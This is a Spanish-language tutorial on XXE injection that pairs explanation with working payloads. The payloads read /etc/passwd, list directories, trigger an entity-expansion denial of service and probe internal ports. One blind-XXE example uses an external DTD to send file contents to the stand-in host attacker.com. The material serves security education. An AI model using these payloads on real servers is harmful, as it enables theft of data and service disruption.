## XXE

- Cuando hablamos de XML External Entity (XXE) Injection, nos referimos a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

- Un ataque XXE generalmente implica la inyección de una entidad XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

- Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.

- Cabe destacar que, en ocasiones, los ataques XXE no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “ir a ciegas” para obtener información confidencial a través de técnicas adicionales, como el uso de un DTD externo.

- Un DTD (Document Type Definition) externo es un archivo que define la estructura y las entidades de un documento XML. 

- Adicionalmente, un ataque XXE puede ser utilizado como un vector para explotar una vulnerabilidad de tipo SSRF (Server-Side Request Forgery), permitiendo al atacante enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima.

### Ejemplos de ataques XXE

#### Ejemplo Básico de Inyección XXE:

Este ejemplo muestra cómo un atacante puede definir una entidad externa para inyectar datos arbitrarios:

```xml
<!DOCTYPE foo [
<!ENTITY xxe "Texto inyectado por el atacante">
]>
<foo>&xxe;</foo>
```

- Se define una entidad `xxe` con un valor arbitrario.
- Cuando el servidor procesa el XML, reemplaza `&xxe;` con el texto definido por el atacante.

#### Enumeración de Directorios:

Este ejemplo intenta enumerar los archivos en un directorio específico:

```xml
<!DOCTYPE list [
<!ENTITY xxe SYSTEM "file:///var/www/">
]>
<list>&xxe;</list>
```

- La entidad `xxe` apunta a un directorio en el sistema.
- Si el servidor permite el acceso, el contenido del directorio será expuesto.

#### Inyección de Entidad Interna:

Este ejemplo utiliza una entidad interna para manipular el contenido del XML:

```xml
<!DOCTYPE foo [
<!ENTITY xxe "Contenido malicioso">
]>
<foo>
    <bar>&xxe;</bar>
</foo>
```

- La entidad `xxe` se utiliza para inyectar contenido malicioso dentro de un nodo XML.
- Esto puede ser útil para manipular la lógica de procesamiento del servidor.

#### Uso de Entidades Recursivas:

Este ejemplo intenta causar un ataque de denegación de servicio (DoS) mediante entidades recursivas:

```xml
<!DOCTYPE bomb [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<bomb>&c;</bomb>
```

- Se definen entidades que se expanden recursivamente.
- Esto puede sobrecargar el servidor al procesar el XML.

#### Referencia a Recursos Remotos:

Este ejemplo intenta cargar un recurso remoto:

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/malicious.xml">
]>
<foo>&xxe;</foo>
```

- La entidad `xxe` apunta a un archivo remoto.
- Si el servidor permite la carga, el atacante puede inyectar contenido adicional desde su servidor.

#### Ejemplos más concretos:

Este ejemplo intenta leer el contenido del archivo `/etc/passwd` en un sistema basado en Unix:

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

- Se define una entidad externa `xxe` que apunta al archivo `/etc/passwd`.
- Cuando el servidor procesa el XML, reemplaza `&xxe;` con el contenido del archivo especificado.

#### XXE Ciego:

Este ejemplo demuestra un ataque XXE ciego donde el contenido de `/etc/passwd` se envía al servidor del atacante:

```xml
<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
<data>&send;</data>
```

Con `evil.dtd` conteniendo:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
```

- El servidor carga un DTD externo desde `http://attacker.com/evil.dtd`.
- El DTD define una entidad `file` que apunta a `/etc/passwd` y una entidad `send` que envía el contenido del archivo al servidor del atacante.

#### Escaneo de Puertos Internos (SSRF):

Este ejemplo utiliza XXE para realizar un escaneo de puertos internos:

```xml
<!DOCTYPE scan [
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
]>
<scan>&xxe;</scan>
```

- Se define una entidad `xxe` que apunta a un servicio interno en `127.0.0.1:8080`.
- Si el puerto está abierto, el servidor intentará conectarse, confirmando la existencia del servicio.



Para practicar esta vulnerabilidad, puedes consultar el laboratorio correspondiente en el siguiente enlace: [Laboratorio de XXE](#).